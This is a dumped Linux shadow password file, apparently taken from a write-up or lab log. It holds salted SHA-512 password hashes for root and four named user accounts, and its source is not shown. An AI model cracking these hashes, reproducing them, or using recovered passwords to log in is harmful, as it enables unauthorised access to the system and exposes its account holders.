root:$6$kdMFceEg$pk9h93tdD7IomhE7L0Y396HO6fxSM.XDh9dgeBhKpdZlM/WYxCZe7yPRNHfZ5FvNRuILVp2NOsqNmgjoSx/IN0:18012:0:99999:7:::
daemon:*:18010:0:99999:7:::
bin:*:18010:0:99999:7:::
sys:*:18010:0:99999:7:::
sync:*:18010:0:99999:7:::
games:*:18010:0:99999:7:::
man:*:18010:0:99999:7:::
lp:*:18010:0:99999:7:::
mail:*:18010:0:99999:7:::
news:*:18010:0:99999:7:::
uucp:*:18010:0:99999:7:::
proxy:*:18010:0:99999:7:::
www-data:*:18010:0:99999:7:::
backup:*:18010:0:99999:7:::
list:*:18010:0:99999:7:::
irc:*:18010:0:99999:7:::
gnats:*:18010:0:99999:7:::
nobody:*:18010:0:99999:7:::
systemd-timesync:*:18010:0:99999:7:::
systemd-network:*:18010:0:99999:7:::
systemd-resolve:*:18010:0:99999:7:::
systemd-bus-proxy:*:18010:0:99999:7:::
_apt:*:18010:0:99999:7:::
messagebus:*:18010:0:99999:7:::
sshd:*:18010:0:99999:7:::
mysql:!:18010:0:99999:7:::
graham:$6$WF7GkVxM$MOL.cXLpG6UTO0M4exCUFwOEiUhW6bwQa.Frg9CerQbTp.EW4QTzEAuio26Aylv.YP0JPAan10tsUFv6kyvRN0:18010:0:99999:7:::
mark:$6$//1vISW6$9pl2v8Jg0mNE7E2mgTQlTwZ1zcaepnDyYE4lIPJDdX7ipnxm/muPD7DraEm3z0jqDe5iH/Em2i6YXJpQD.5pl0:18010:0:99999:7:::
sarah:$6$DoSO7Ycr$2GtM5.8Lfx9Sw8X1fDMF.7zWDoVoy1892nyp0iFsqh5CfmtEROtxmejvQxu0N/8D7X8PQAGKYGl.gUb6/cG210:18010:0:99999:7:::
jens:$6$JWiFWXb8$cGQi07IUqln/uLLVmmrU9VLg7apOH9IlxoyndELCGjLenxfAaVec5Gjaw2DA0QHRwS9hTB5cI2sg/Wk1OFoAh/:18011:0:99999:7:::
```